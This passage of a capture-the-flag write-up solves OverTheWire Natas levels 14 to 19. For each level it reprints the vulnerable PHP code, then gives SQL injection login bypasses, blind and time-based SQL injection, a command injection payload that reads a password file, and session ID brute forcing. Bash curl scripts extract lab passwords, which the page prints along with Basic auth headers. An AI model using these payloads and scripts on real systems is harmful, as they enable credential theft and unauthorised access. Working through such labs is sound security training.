+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas14&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas14&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+&lt;?
+if(array_key_exists(&quot;username&quot;, $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');
+    mysql_select_db('natas14', $link);
+
+    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;
+    if(array_key_exists(&quot;debug&quot;, $_GET)) {
+        echo &quot;Executing query: $query&lt;br&gt;&quot;;
+    }
+
+    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {
+            echo &quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;;
+    } else {
+            echo &quot;Access denied!&lt;br&gt;&quot;;
+    }
+    mysql_close($link);
+} else {
+?&gt;
+
+&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt;
+Password: &lt;input name=&quot;password&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class=language-text>SELECT * from users where username=&quot;username_input&quot; and password=&quot;password_input&quot;
+</code></pre><p>so if we input</p><pre><code class=language-text>natas14
+pass&quot; or &quot;1&quot;=&quot;1
+</code></pre><p>it will look like this.</p><pre><code class=language-text>SELECT * from users where username=&quot;natas14&quot; or and password=&quot;pass&quot; or &quot;1&quot;=&quot;1&quot;
+</code></pre><p>Since the or is always true ( 1 = 1) the password doesnt need to be correct.</p><pre><code class=language-text>AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+</code></pre><h3 id=natas15>Natas15</h3><pre><code class=language-markup>&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas15&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas15&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+&lt;?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists(&quot;username&quot;, $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;');
+    mysql_select_db('natas15', $link);
+
+    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;
+    if(array_key_exists(&quot;debug&quot;, $_GET)) {
+        echo &quot;Executing query: $query&lt;br&gt;&quot;;
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) &gt; 0) {
+        echo &quot;This user exists.&lt;br&gt;&quot;;
+    } else {
+        echo &quot;This user doesn't exist.&lt;br&gt;&quot;;
+    }
+    } else {
+        echo &quot;Error in query.&lt;br&gt;&quot;;
+    }
+
+    mysql_close($link);
+} else {
+?&gt;
+
+&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>blind sql injection</p><pre><code class=language-text>Input  : natas16
+Query  : SELECT * from users where username=&quot;natas16&quot;
+Result : true
+</code></pre><pre><code class=language-text>Input  : natas16&quot; AND &quot;1&quot;=&quot;1
+Query  : SELECT * from users where username=&quot;natas16&quot; AND &quot;1&quot;=&quot;1&quot;
+Result : true
+</code></pre><p>A good next thing to know whould be the password lenght. Lets first test the username lenght.</p><p>Testing username lenght<br>We should get a &lsquo;This user exists.&rsquo; if the lenght of username is 7.</p><pre><code class=language-text>input  : natas16&quot; AND (SELECT LENGTH(username) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=1#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT LENGTH(username) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=1#
+Result : false
+</code></pre><pre><code class=language-text>input  : natas16&quot; AND (SELECT LENGTH(username) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=7#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT LENGTH(username) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=7#
+Result : true
+</code></pre><p>So now lets test the password lenght.</p><pre><code class=language-text>input  : natas16&quot; AND (SELECT LENGTH(password) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=1#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT LENGTH(password) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=1#
+Result : false
+</code></pre><p>so far all the passwords had a lenght of 32, so lets that that.</p><pre><code class=language-text>input  : natas16&quot; AND (SELECT LENGTH(password) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=32#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT LENGTH(password) FROM users WHERE username=&quot;natas16&quot; LIMIT 1)=32#
+Result : true
+</code></pre><p>now lets test the actual password<br>first verify with the username</p><pre><code class=language-text>Input  : natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;a%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;a%&quot;#
+Result : false
+</code></pre><pre><code class=language-text>Input  : natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;n%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;n%&quot;#
+Result : true
+</code></pre><p>So we know this works. Now lets try the password.</p><pre><code class=language-text>Input  : natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;W%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;W%&quot;#
+Result : true
+</code></pre><p>but if we try</p><pre><code class=language-text>Input  : natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;w%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE &quot;w%&quot;#
+Result : true
+</code></pre><p>this also works. This is because LIKE is case insensitive, we should use LIKE BINARY.</p><pre><code class=language-text>Input  : natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;N%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;N%&quot;#
+Result : false
+</code></pre><pre><code class=language-text>Input  : natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;n%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT username FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;n%&quot;#
+Result : true
+</code></pre><pre><code class=language-text>Input  : natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;w%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;w%&quot;#
+Result : false
+</code></pre><pre><code class=language-text>natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;W%&quot;#
+Query  : SELECT * from users where username=&quot;natas16&quot; AND (SELECT password FROM users WHERE username=&quot;natas16&quot; LIMIT 1) LIKE BINARY &quot;W%&quot;#
+Result : true
+</code></pre><p>Lets create a bash script to get the password</p><pre><code class=language-bash>passwordlenght=32
+CurrentChar=0
+password=&quot;&quot;
+while [ $CurrentChar -ne $passwordlenght ]
+do
+    for letter in {{a..z},{A..Z},{0..9}}; do
+        injection=&quot;\&quot; AND (SELECT password FROM users WHERE username=\&quot;natas16\&quot; LIMIT 1) LIKE BINARY \&quot;$password$letter%\&quot;#&quot;
+        data=&quot;username=natas16$injection&quot;
+        curl_output=$(curl -s 'http://natas15.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' -d &quot;$data&quot;)
+        if echo $curl_output | grep -q &quot;This user exists.&quot;; then
+            password=&quot;${password}${letter}&quot;
+            CurrentChar=$(( $CurrentChar + 1 ))
+            echo &quot;[+] Password: $password&quot;
+            continue 2
+        fi
+    done
+done
+</code></pre><pre><code class=language-text>[+] Password: W
+[+] Password: Wa
+[+] Password: WaI
+[+] Password: WaIH
+[+] Password: WaIHE
+[+] Password: WaIHEa
+[+] Password: WaIHEac
+[+] Password: WaIHEacj
+[+] Password: WaIHEacj6
+[+] Password: WaIHEacj63
+[+] Password: WaIHEacj63w
+[+] Password: WaIHEacj63wn
+[+] Password: WaIHEacj63wnN
+[+] Password: WaIHEacj63wnNI
+[+] Password: WaIHEacj63wnNIB
+[+] Password: WaIHEacj63wnNIBR
+[+] Password: WaIHEacj63wnNIBRO
+[+] Password: WaIHEacj63wnNIBROH
+[+] Password: WaIHEacj63wnNIBROHe
+[+] Password: WaIHEacj63wnNIBROHeq
+[+] Password: WaIHEacj63wnNIBROHeqi
+[+] Password: WaIHEacj63wnNIBROHeqi3
+[+] Password: WaIHEacj63wnNIBROHeqi3p
+[+] Password: WaIHEacj63wnNIBROHeqi3p9
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5n
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+[+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+</code></pre><p>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</p><h3 id=natas16>Natas16</h3><pre><code class=language-php>Find words containing: &lt;input name=needle&gt;&lt;input type=submit name=submit value=Search&gt;&lt;br&gt;&lt;br&gt;
+&lt;/form&gt;
+
+
+Output:
+&lt;pre&gt;
+&lt;?
+$key = &quot;&quot;;
+
+if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
+    $key = $_REQUEST[&quot;needle&quot;];
+}
+
+if($key != &quot;&quot;) {
+    if(preg_match('/[;|&amp;`\'&quot;]/',$key)) {
+        print &quot;Input contains an illegal character!&quot;;
+    } else {
+        passthru(&quot;grep -i \&quot;$key\&quot; dictionary.txt&quot;);
+    }
+}
+?&gt;
+&lt;/pre&gt;
+
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>$(grep -E ^8.* /etc/natas_webpass/natas17)hackers</p><pre><code class=language-bash>passwordlenght=32
+CurrentChar=0
+password=&quot;&quot;
+while [ $CurrentChar -ne $passwordlenght ]
+do
+    for letter in {{a..z},{A..Z},{0..9}}; do
+        curl_output=$(curl -s &quot;http://natas16.natas.labs.overthewire.org/?needle=&quot;%&quot;24&quot;%&quot;28grep+-E+&quot;%&quot;5E${password}${letter}.*+&quot;%&quot;2Fetc&quot;%&quot;2Fnatas_webpass&quot;%&quot;2Fnatas17&quot;%&quot;29hackers&amp;submit=Search&quot; -H &quot;Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==&quot;)
+        if echo $curl_output | grep -q -v &quot;hackers&quot;; then
+            password=&quot;${password}${letter}&quot;
+            CurrentChar=$(( $CurrentChar + 1 ))
+            echo &quot;[+] Password: $password&quot;
+            continue 2
+        fi
+    done
+done
+</code></pre><pre><code class=language-text>[+] Password: 8
+[+] Password: 8P
+[+] Password: 8Ps
+[+] Password: 8Ps3
+[+] Password: 8Ps3H
+[+] Password: 8Ps3H0
+[+] Password: 8Ps3H0G
+[+] Password: 8Ps3H0GW
+[+] Password: 8Ps3H0GWb
+[+] Password: 8Ps3H0GWbn
+[+] Password: 8Ps3H0GWbn5
+[+] Password: 8Ps3H0GWbn5r
+[+] Password: 8Ps3H0GWbn5rd
+[+] Password: 8Ps3H0GWbn5rd9
+[+] Password: 8Ps3H0GWbn5rd9S
+[+] Password: 8Ps3H0GWbn5rd9S7
+[+] Password: 8Ps3H0GWbn5rd9S7G
+[+] Password: 8Ps3H0GWbn5rd9S7Gm
+[+] Password: 8Ps3H0GWbn5rd9S7GmA
+[+] Password: 8Ps3H0GWbn5rd9S7GmAd
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdg
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQ
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQN
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNd
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
+[+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+</code></pre><p>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</p><h3 id=natas17>Natas17</h3><pre><code class=language-php>&lt;?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists(&quot;username&quot;, $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '&lt;censored&gt;');
+    mysql_select_db('natas17', $link);
+
+    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;
+    if(array_key_exists(&quot;debug&quot;, $_GET)) {
+        echo &quot;Executing query: $query&lt;br&gt;&quot;;
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) &gt; 0) {
+        //echo &quot;This user exists.&lt;br&gt;&quot;;
+    } else {
+        //echo &quot;This user doesn't exist.&lt;br&gt;&quot;;
+    }
+    } else {
+        //echo &quot;Error in query.&lt;br&gt;&quot;;
+    }
+
+    mysql_close($link);
+} else {
+?&gt;
+
+&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class=language-text>natas18&quot; and sleep(3) #
+</code></pre><pre><code class=language-text>curl -o /dev/null -s -X POST &quot;http://natas17.natas.labs.overthewire.org/index.php&quot; -H &quot;Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==&quot; --data &quot;username=natas18&quot;%&quot;22+and++sleep&quot;%&quot;283&quot;%&quot;29+&quot;%&quot;23&quot; -w %{time_total}
+</code></pre><pre><code class=language-text>natas18&quot; AND IF(1=1, SLEEP(3), 0)#
+</code></pre><pre><code class=language-text>natas18&quot; AND IF((SELECT MID(username, 1, 1) FROM users WHERE
+username=&quot;natas18&quot;)='n', SLEEP(3), 0) #
+</code></pre><pre><code class=language-bash>passwordlenght=32
+CurrentChar=0
+password=&quot;&quot;
+sleeptime=10
+MIDCounter=1
+while [ $CurrentChar -ne $passwordlenght ]
+do
+    for letter in {{a..z},{A..Z},{0..9}}; do
+        injection=&quot;\&quot; AND IF((SELECT MID(password, 1, $MIDCounter) FROM users WHERE username=\&quot;natas18\&quot;)='$password$letter', SLEEP($sleeptime), 0) #&quot;
+        #echo $injection
+        data=&quot;username=natas18$injection&quot;
+        curl_output=$(curl -o /dev/null -s  'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' -d &quot;$data&quot; -w %{time_total})
+        time=$(echo $curl_output | cut -d &quot;.&quot; -f 1)
+        if [ $time -ge 10 ]; then
+            password=&quot;${password}${letter}&quot;
+            CurrentChar=$(( $CurrentChar + 1 ))
+            MIDCounter=$(( $MIDCounter + 1 ))
+            echo &quot;[+] Password: $password&quot;
+            continue 2
+        fi
+    done
+done
+</code></pre><p>works, but case insensative.</p><pre><code class=language-text>[+] Password: x
+[+] Password: xv
+[+] Password: xvk
+[+] Password: xvki
+[+] Password: xvkiq
+[+] Password: xvkiqd
+[+] Password: xvkiqdj
+[+] Password: xvkiqdjy
+</code></pre><pre><code class=language-bash>passwordlenght=32
+CurrentChar=0
+password=&quot;&quot;
+sleeptime=10
+while [ $CurrentChar -ne $passwordlenght ]
+do
+    for letter in {{a..z},{A..Z},{0..9}}; do
+        injection=&quot;\&quot; AND IF(password LIKE BINARY \&quot;$password$letter%\&quot;, SLEEP($sleeptime), 0) #&quot;
+        data=&quot;username=natas18$injection&quot;
+        curl_output=$(curl -o /dev/null -s  'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' -d &quot;$data&quot; -w %{time_total})
+        time=$(echo $curl_output | cut -d &quot;.&quot; -f 1)
+        if [ $time -ge 10 ]; then
+            password=&quot;${password}${letter}&quot;
+            CurrentChar=$(( $CurrentChar + 1 ))
+            MIDCounter=$(( $MIDCounter + 1 ))
+            echo &quot;[+] Password: $password&quot;
+            continue 2
+        fi
+    done
+done
+</code></pre><pre><code class=language-text>+] Password: x
+[+] Password: xv
+[+] Password: xvK
+[+] Password: xvKI
+[+] Password: xvKIq
+[+] Password: xvKIqD
+[+] Password: xvKIqDj
+[+] Password: xvKIqDjy
+[+] Password: xvKIqDjy4
+[+] Password: xvKIqDjy4O
+[+] Password: xvKIqDjy4OP
+[+] Password: xvKIqDjy4OPv
+[+] Password: xvKIqDjy4OPv7
+[+] Password: xvKIqDjy4OPv7w
+[+] Password: xvKIqDjy4OPv7wC
+[+] Password: xvKIqDjy4OPv7wCR
+[+] Password: xvKIqDjy4OPv7wCRg
+[+] Password: xvKIqDjy4OPv7wCRgD
+[+] Password: xvKIqDjy4OPv7wCRgDl
+[+] Password: xvKIqDjy4OPv7wCRgDlm
+[+] Password: xvKIqDjy4OPv7wCRgDlmj
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0p
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pF
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFs
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsC
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCs
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsD
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
+[+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+</code></pre><h3 id=natas18>Natas18</h3><pre><code class=language-php>&lt;?
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST[&quot;username&quot;] == &quot;admin&quot;) {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists(&quot;debug&quot;, $_GET)) {
+        print &quot;DEBUG: $msg&lt;br&gt;&quot;;
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists(&quot;PHPSESSID&quot;, $_COOKIE) and isValidID($_COOKIE[&quot;PHPSESSID&quot;])) {
+    if(!session_start()) {
+        debug(&quot;Session start failed&quot;);
+        return false;
+    } else {
+        debug(&quot;Session start ok&quot;);
+        if(!array_key_exists(&quot;admin&quot;, $_SESSION)) {
+        debug(&quot;Session was old: admin flag set&quot;);
+        $_SESSION[&quot;admin&quot;] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) {
+    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;
+    print &quot;&lt;pre&gt;Username: natas19\n&quot;;
+    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;
+    } else {
+    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;;
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists(&quot;username&quot;, $_REQUEST) &amp;&amp; array_key_exists(&quot;password&quot;, $_REQUEST)) {
+    session_id(createID($_REQUEST[&quot;username&quot;]));
+    session_start();
+    $_SESSION[&quot;admin&quot;] = isValidAdminLogin();
+    debug(&quot;New session started&quot;);
+    $showform = false;
+    print_credentials();
+    }
+}
+
+if($showform) {
+?&gt;
+
+&lt;p&gt;
+Please login with your admin account to retrieve credentials for natas19.
+&lt;/p&gt;
+
+&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt;
+Password: &lt;input name=&quot;password&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+</code></pre><p>probally somthing in the cookie with PHPSESSID= {&ldquo;PHPSESSID&rdquo;:{&ldquo;httpOnly&rdquo;:true,&ldquo;path&rdquo;:"/",&ldquo;value&rdquo;:&ldquo;238&rdquo;}}</p><p>No idea how it works. Lets figure it out</p><pre><code class=language-text>Okay so when you load the page it the following happens:
+    A maxid is set to 640
+    showform is set to true;
+    If my_session_start returns TRUE:
+        it will call print_credentials.
+        set showform to false
+    Else:
+        check if a username and password has been send, ifso:
+            call createID with the username as input and give the output to session_id
+            run session_start
+            It then sets a custom session variable called admin using a function called isvalidadminlogin; this function though has been disabled and now does not return 1 but simply returns nothing.
+            set showform to false
+            call print_credentials.
+
+What does my_session_start do ?
+if PHPSESSID is in the cookie and the PHPSESSID is valid (numaric number):
+    run session start:
+        if it failes,
+            return false
+        else
+            check if admin exists in $_SESSION ifso
+                set admin to zero.
+        return true.
+
+What does print_credentials do ?
+    if the custom session variable admin exits and if its been set to one we will be granted a admin session
+    anything else is a normal user session
+
+What does createID do ?
+    Generate a random interger between 1 and the maxid (which is 640)
+
+what does session_id do ?
+    session_id() is used to get or set the session id for the current session.
+    If id is specified, it will replace the current session id. session_id() needs to be called before session_start() for that purpose.
+
+What does session_start do ?
+    session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.
+
+
+So how can we break this ?
+    my_session_start checks if there is a valid PHPSESSID, it will then start the session with that id.
+    If there is currently a PHPSESSID for a admin session, and we correctly guess this, we could get a admin session. This way we entirely skip the $_SESSION[&quot;admin&quot;] = isValidAdminLogin() since this will only be checked/set if my_session_start returns false or if it exists.
+    Since the maxid is been set to 640 this should be brute forceable.
+</code></pre><p>Doing the breakiage.</p><pre><code class=language-bash>MaxCookieID=640
+CurrentID=0
+while [ $CurrentID -ne $MaxCookieID ]
+do
+    CurrentID=$(( $CurrentID + 1 ))
+    SessionCookie=&quot;PHPSESSID=$CurrentID&quot;
+    curl_output=$(curl -s $'http://natas18.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' --cookie &quot;$SessionCookie&quot; --data 'username=admin&amp;password=password')
+    if echo $curl_output | grep -q &quot;regular user&quot;; then
+        echo &quot;[-] $CurrentID out of $MaxCookieID is not a admin session.&quot;
+    else
+        echo &quot;[+] $CurrentID out of $MaxCookieID is a admin session.&quot;
+        echo &quot;[+] $(echo $curl_output | grep Password | cut -d &quot;&lt;&quot; -f 1 )&quot;
+        break
+    fi
+done
+</code></pre><pre><code class=language-bash>[-] 1 out of 640 is not a admin session.
+[-] 2 out of 640 is not a admin session.
+[-] 3 out of 640 is not a admin session.
+[-] 4 out of 640 is not a admin session.
+[-] 5 out of 640 is not a admin session.
+[-] 6 out of 640 is not a admin session.
+[-] 7 out of 640 is not a admin session.
+[-] 8 out of 640 is not a admin session.
+[-] 9 out of 640 is not a admin session.
+...
+[-] 115 out of 640 is not a admin session.
+[-] 116 out of 640 is not a admin session.
+[-] 117 out of 640 is not a admin session.
+[-] 118 out of 640 is not a admin session.
+[+] 119 out of 640 is a admin session.
+[+] Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+</code></pre><p>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</p><h3 id=natas19>Natas19</h3><pre><code class=language-markup>This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20.
+</code></pre><p>Lets bake some cookies.</p><pre><code class=language-text>for n in {0..1000}; do
+    curl -v -s 'http://natas19.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --data 'username=admin&amp;password=password' 2&gt;&amp;1 | grep PHP
+done
+
+&lt; Set-Cookie: PHPSESSID=312d61646d696e; path=/; HttpOnly
+&lt; Set-Cookie: PHPSESSID=312d61646d696e; path=/; HttpOnly
+&lt; Set-Cookie: PHPSESSID=332d61646d696e; path=/; HttpOnly
+&lt; Set-Cookie: PHPSESSID=342d61646d696e; path=/; HttpOnly
+...
+&lt; Set-Cookie: PHPSESSID=3633352d61646d696e; path=/; HttpOnly
+&lt; Set-Cookie: PHPSESSID=3633352d61646d696e; path=/; HttpOnly
+&lt; Set-Cookie: PHPSESSID=3633372d61646d696e; path=/; HttpOnly
